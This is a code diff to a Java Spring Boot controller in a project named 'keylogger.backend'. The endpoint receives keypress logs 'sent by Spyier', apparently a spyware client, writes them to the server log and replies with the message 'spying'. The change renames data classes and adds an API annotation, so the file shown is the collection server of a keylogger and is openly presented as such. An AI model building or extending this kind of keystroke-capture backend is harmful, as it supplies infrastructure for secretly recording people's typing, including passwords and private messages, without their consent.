@@ -1,7 +1,9 @@
 package keylogger.backend.controllers;
 
+import io.swagger.v3.oas.annotations.Operation;
 import jakarta.validation.constraints.Null;
-import keylogger.backend.dtos.KeyboardDto;
+import keylogger.backend.dtos.payloads.KeyboardPayloadDto;
+import keylogger.backend.dtos.responses.KeyboardResponseDto;
 import lombok.extern.slf4j.Slf4j;
 import org.springframework.http.ResponseEntity;
 import org.springframework.web.bind.annotation.PostMapping;
@@ -13,11 +15,12 @@ import org.springframework.web.bind.annotation.RestController;
 @RestController
 @RequestMapping("/keyboard")
 public class KeyboardController {
+    @Operation(summary = "Handles keyboard logs sent by Spyier.")
     @PostMapping
-    public ResponseEntity<Null> handleKeyboardLogs(@RequestBody KeyboardDto keyboardDto) {
-        if (!keyboardDto.logs().isEmpty()) {
-            log.info(keyboardDto.logs());
+    public ResponseEntity<KeyboardResponseDto> handleKeyboardLogs(@RequestBody KeyboardPayloadDto keyboardDto) {
+        if (!keyboardDto.keypress().isEmpty()) {
+            log.info(keyboardDto.keypress());
         }
-        return ResponseEntity.noContent().build();
+        return ResponseEntity.ok(new KeyboardResponseDto("spying \uD83D\uDE08"));
     }
 }
